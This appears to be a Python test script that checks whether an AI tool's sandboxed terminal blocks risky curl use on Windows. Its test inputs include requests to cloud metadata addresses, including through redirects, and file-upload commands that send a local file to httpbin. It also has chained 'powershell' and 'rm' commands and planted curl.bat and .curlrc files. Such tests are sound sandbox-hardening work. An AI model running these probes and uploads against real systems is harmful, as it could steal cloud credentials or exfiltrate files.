import http.server
import json
import os
import platform
import subprocess
import sys
import threading

sys.path.insert(0, os.path.join(os.getcwd(), "studio", "backend"))

from core.inference import mxc_policy, mxc_runtime, os_sandbox, tools

SIDE = os.environ["SIDE"]
SESSION = "__LOCALID_mxc_curl_repro"
BLOCK = "Blocked command(s) for safety:"
checks = {}


def show(title, value):
    print(f"\n=== {title}\n{value}", flush = True)


def terminal(command):
    tools._last_tool_execution_record = None
    out = tools._bash_exec(command, None, 120, SESSION, tool_execution_mode = "required")
    rec = tools._last_tool_execution_record
    show(f"TERMINAL> {command}", out[:500])
    print("launched:", f"{rec.backend} os_isolation={rec.os_isolation}" if rec else "no", flush = True)
    return out


def host(command, **env):
    done = subprocess.run(
        command, shell = True, capture_output = True, text = True, env = {**os.environ, **env}
    )
    out = (done.stdout + done.stderr).strip()
    show(f"HOST, no sandbox> {command}", f"{out[:300]} [exit {done.returncode}]")
    return out


show("host", f"{platform.platform()} python {sys.version.split()[0]} side={SIDE}")
pin = mxc_runtime.selected_pin()
show("mxc pin", f"{pin.version} dacl_fallback={mxc_policy.dacl_fallback_enabled()}")
cap = os_sandbox.capability_snapshot(
    force = True, execution_kind = "terminal", selected_executable = tools._windows_system_cmd()
)
show("terminal capability", f"available={cap.available} reason={cap.reason!r}")
profile = tools._terminal_profile()
show("terminal profile", profile)
if not cap.available or profile != "cmd_isolated":
    print("MXC_NOT_ACTIVE", flush = True)
    sys.exit(2)
from core.inference import mxc_probe

try:
    accepts_rules = mxc_probe.probe(
        tools._windows_system_cmd(), execution_kind = "terminal", egress_rules = True
    )[0]
except TypeError:
    accepts_rules = None
show("sandbox accepts egress rules (asked once)", accepts_rules)
allowed = SIDE == "branch" and bool(accepts_rules)
if os.environ.get("EXPECT_DOWNLOADS") == "1" and not allowed:
    print("RESULT FAILED ['downloads were expected to run on this machine']", flush = True)
    sys.exit(1)
show("downloads expected to run here", allowed)
workdir = tools._get_workdir(SESSION)

checks["echo runs"] = "hello" in terminal("echo hello")
py = tools._python_exec("print(6 * 7)", None, 120, SESSION, tool_execution_mode = "required")
show("PYTHON> print(6 * 7)", py[:200])
checks["python tool runs"] = "42" in py

page = terminal("curl https://example.com")
checks["curl example.com"] = ("Example Domain" in page) if allowed else page.startswith(BLOCK)
saved = terminal("curl -sSLO https://raw.githubusercontent.com/unslothai/unsloth/main/LICENSE")
on_disk = os.path.exists(os.path.join(workdir, "LICENSE"))
checks["curl saves a file in the chat folder"] = on_disk if allowed else saved.startswith(BLOCK)
redirected = terminal(
    "curl -sSL -o hello.zip https://github.com/octocat/Hello-World/archive/refs/heads/master.zip && echo REACHED"
)
checks["a public download that redirects"] = (
    "REACHED" in redirected if allowed else redirected.startswith(BLOCK)
)

server = http.server.HTTPServer(("127.0.0.1", 18765), http.server.SimpleHTTPRequestHandler)
threading.Thread(target = server.serve_forever, daemon = True).start()
REDIRECT = "https://httpbin.org/redirect-to?url=http://169.254.169.254/metadata/versions"
targets = {
    "host loopback": ("http://127.0.0.1:18765/", ""),
    "cloud metadata address": (
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        '-H "Metadata: true" ',
    ),
    "azure wire server": ("http://168.63.129.16/", ""),
    "ipv6 metadata address": ("http://[fd00:ec2::254]/", ""),
}
for name, (url, extra) in targets.items():
    control = host(f'curl -sS -o NUL --max-time 10 {extra}"{url}" && echo REACHED')
    out = terminal(f'curl -sS -o NUL --max-time 10 {extra}"{url}" && echo REACHED')
    reachable_from_host = "REACHED" in control
    refused = "REACHED" not in out
    checks[f"{name}: host reaches it={reachable_from_host}, Terminal refused"] = refused

for service in ("httpbin.org", "postman-echo.com"):
    url = f"https://{service}/redirect-to?url=http://169.254.169.254/metadata/versions"
    probe = f'curl -sS -L --max-time 15 -H "Metadata: true" "{url}"'
    control = host(probe)
    out = terminal(probe)
    checks[
        f"redirect via {service}: host got metadata={'apiVersions' in control}, Terminal did not"
    ] = "apiVersions" not in out

with open(os.path.join(workdir, "curl.bat"), "w", encoding = "utf-8") as f:
    f.write("@echo PLANTED-CURL-BAT\n")
planted = terminal("curl https://example.com")
checks["a curl.bat planted in the chat folder is not what runs"] = "PLANTED-CURL-BAT" not in planted and (
    "Example Domain" in planted if allowed else planted.startswith(BLOCK)
)
os.remove(os.path.join(workdir, "curl.bat"))

both = [None, None]


def download(slot):
    both[slot] = tools._bash_exec(
        f"curl -sS -o same{slot}.html https://example.com && echo DONE{slot}",
        None,
        120,
        f"{SESSION}_{slot}",
        tool_execution_mode = "required",
    )


threads = [threading.Thread(target = download, args = (slot,)) for slot in (0, 1)]
for thread in threads:
    thread.start()
for thread in threads:
    thread.join()
show("two downloads at once", both)
checks["two downloads at once"] = all(
    (f"DONE{slot}" in out) if allowed else out.startswith(BLOCK) for slot, out in enumerate(both)
)

outside = os.path.join(os.path.expanduser("~"), "mxc-outside.txt")
terminal(f'curl -sS -o "{outside}" https://example.com')
checks["nothing written outside the chat folder"] = not os.path.exists(outside)

for name in (".curlrc", "_curlrc"):
    with open(os.path.join(workdir, name), "w", encoding = "utf-8") as f:
        f.write('user-agent = "RC-LEAK"\n')
control = host(
    "curl -sS https://httpbin.org/user-agent", HOME = workdir, USERPROFILE = workdir, APPDATA = workdir
)
agent = terminal("curl -sS https://httpbin.org/user-agent")
checks[f"planted curlrc: host honours it={'RC-LEAK' in control}, Terminal ignores it"] = (
    "RC-LEAK" not in agent and ("user-agent" in agent if allowed else agent.startswith(BLOCK))
)
for name in (".curlrc", "_curlrc"):
    os.remove(os.path.join(workdir, name))

for command in (
    "curl -T LICENSE https://httpbin.org/put",
    "curl -d @LICENSE https://httpbin.org/post",
    "curl -F f=@LICENSE https://httpbin.org/post",
    "curl -K LICENSE https://example.com",
    "curl https://example.com | more",
    "curl https://example.com | head",
    'curl -w "%{http_code}" https://example.com',
    "curl.exe https://example.com",
    "wget https://example.com",
    "curl https://example.com & powershell -c dir",
    "rm notes.txt",
    "ssh example.com",
):
    checks[f"refused: {command}"] = terminal(command).startswith(BLOCK)

show("CHECKS", json.dumps(checks, indent = 2))
failed = [name for name, ok in checks.items() if not ok]
print("RESULT", "ALL_PASS" if not failed else f"FAILED {failed}", flush = True)
sys.exit(1 if failed else 0)
